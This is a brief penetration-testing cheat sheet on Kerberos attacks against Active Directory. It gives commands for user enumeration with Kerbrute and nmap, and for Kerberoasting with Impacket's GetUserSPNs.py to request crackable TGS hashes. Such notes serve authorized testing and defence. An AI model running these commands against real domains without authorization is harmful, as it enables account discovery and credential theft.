# Unix Shell

## 01 - Enumerate Users

### 1.1 - Kerbrute

- Enumerate users against the active directory

`$ ./kerbrute userenum --dc <IP> -d <domain_name> users.txt -t 64`

### 1.2 - Nmap

`$ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="<domain_name>",userdb=users.txt <IP>`

## 02 - Impacket

- Request a Kerberos 5 TGS-REP etype 23 hash from an SPN user account

`$ GetUserSPNs.py -request -dc-ip <IP> <domain_name>/<username>:<password>`

---
## References

- [Impacket](https://github.com/fortra/impacket)

- [Kerbrute](https://github.com/ropnop/kerbrute)

- [Certcube: Kerberoasting Common Tools](https://blog.certcube.com/kerberoasting-common-tools/)

- [Pentesting Kerberos 88](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88)